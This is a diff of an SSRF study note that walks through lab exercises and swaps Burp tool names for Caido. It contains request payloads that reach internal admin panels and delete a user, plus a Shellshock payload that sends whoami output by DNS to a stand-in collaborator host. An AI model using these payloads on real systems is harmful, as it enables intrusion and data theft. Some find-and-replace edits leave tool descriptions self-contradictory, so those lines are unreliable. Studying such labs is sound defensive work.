@@ -73,7 +73,7 @@ stockApi=http://localhost/admin
 
 ### 3. SSRF against internal back-end systems
 
-Enumerate the internal network (common RFC 1918 ranges: `192.168.0.x`, `10.x.x.x`, `172.16-31.x.x`). Use Burp Intruder to sweep the last octet:
+Enumerate the internal network (common RFC 1918 ranges: `192.168.0.x`, `10.x.x.x`, `172.16-31.x.x`). Use Caido Automate to sweep the last octet:
 
 ```http
 stockApi=http://192.168.0.§1§:8080/admin
@@ -83,7 +83,7 @@ Look for responses with different length or status code — these indicate an ac
 
 ### 4. Blind SSRF — out-of-band detection
 
-When the response is not returned to you, use Burp Collaborator or an `interactsh` server to confirm the vulnerability:
+When the response is not returned to you, use interactsh/OAST or an `interactsh` server to confirm the vulnerability:
 
 ```http
 Referer: https://YOUR-COLLABORATOR-ID.oastify.com
@@ -263,7 +263,7 @@ POST /product/stock HTTP/1.0
 stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
 ```
 
-The application validates the domain (`weliketoshop.net` is allowed), then follows the redirect to the internal target. Enable "Follow redirects" in Burp Repeater for this to work.
+The application validates the domain (`weliketoshop.net` is allowed), then follows the redirect to the internal target. Enable "Follow redirects" in Caido Replay for this to work.
 
 ### SSRF via XXE
 
@@ -505,9 +505,9 @@ location /proxy {
 
 ## Tools
 
-- [[burp-suite]] — Intruder for IP/port enumeration; Repeater for manual bypass testing; Collaborator for blind SSRF OOB detection; **Collaborator Everywhere** extension for automatic header injection across all in-scope requests
+- [[caido]] — Automate for IP/port enumeration; Replay for manual bypass testing. For blind SSRF OOB use interactsh (or Burp Collaborator); Burp's **Collaborator Everywhere** extension auto-injects OOB payloads across all in-scope requests (Burp-only)
 - Turbo Intruder — high-concurrency requests for port sweeping
-- `interactsh` (`interactsh-client`) — open-source OOB interaction server (alternative to Burp Collaborator)
+- `interactsh` (`interactsh-client`) — open-source OOB interaction server (alternative to interactsh/OAST)
 - **SSRFmap** (`swisskyrepo/SSRFmap`) — automated SSRF exploitation framework; detects and exploits common SSRF sinks
 - **Gopherus** (`tarunkant/Gopherus`) — SSRF payload generator for Gopher protocol targets (Redis, MySQL, FastCGI, memcached, SMTP)
 - **rbndr** (`taviso/rbndr`) — DNS rebinding test tool; automates the first-IP / second-IP rebind sequence for SSRF filter bypass
@@ -683,7 +683,7 @@ stockApi=http://localhost/admin/delete?username=carlos
 
 ### Lab 2 — Basic SSRF against another back-end system (Apprentice)
 
-The admin panel is on an internal `192.168.0.X:8080` host. Use Burp Intruder to sweep the last octet (1–255):
+The admin panel is on an internal `192.168.0.X:8080` host. Use Caido Automate to sweep the last octet (1–255):
 
 ```http
 stockApi=http://192.168.0.§1§:8080/admin
@@ -701,7 +701,7 @@ stockApi=http://192.168.0.23:8080/admin/delete?username=carlos
 
 The server fetches the URL in the `Referer` header when a product page loads. The response is never returned to the user — confirm via Collaborator callback.
 
-1. Generate a Burp Collaborator payload URL.
+1. Generate a interactsh/OAST payload URL.
 2. Intercept any product page request and replace the `Referer` header:
 
 ```http
@@ -773,7 +773,7 @@ The server fetches the `Referer` header (blind SSRF) and the internal back-end a
 () { :;}; /bin/nslookup $(whoami).<collaborator-id>.oastify.com
 ```
 
-3. Use Burp Intruder to sweep `192.168.0.[1-255]:8080` in the `Referer` header while the Shellshock payload rides in `User-Agent`:
+3. Use Caido Automate to sweep `192.168.0.[1-255]:8080` in the `Referer` header while the Shellshock payload rides in `User-Agent`:
 
 ```http
 Referer: http://192.168.0.§1§:8080/
